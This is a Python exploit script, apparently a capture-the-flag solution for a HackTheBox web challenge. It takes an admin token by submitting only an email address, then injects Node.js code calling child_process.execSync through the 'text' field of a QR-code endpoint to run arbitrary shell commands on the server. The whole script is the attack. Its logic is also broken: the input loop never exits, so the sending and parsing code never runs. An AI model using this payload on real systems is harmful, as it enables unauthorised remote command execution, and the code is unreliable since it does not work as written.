#!/usr/bin/python3

import requests
import json

#Adjust with your port/ip
server="localhost"
port=5000
url=f"http://{server}:{port}"
auth_endpoint=f"{url}/api/auth/authenticate"
qr_endpoint=f"{url}/api/service/generate"

#Getting the admin token
headers = {"Content-Type": "application/json"}
data = {"email": "yovecio@hackthebox.com"}
response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
token = response.json()['token']

#Getting the input command
while True:
    user_input = input("> ")
    payload={ "text": "' + require('child_process').execSync('" + user_input + "').toString() + `'`, statusCode: 403})//"}
    print(payload)

#Replace single with double quotes for JSON validity
user_input = user_input.replace("'", '"')

#Sending the command
headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
response = requests.post(qr_endpoint, headers=headers, data=json.dumps(payload))

#Parsing the response
output = response.json()['message'].split("The input \"")[1][:-2]
print(output)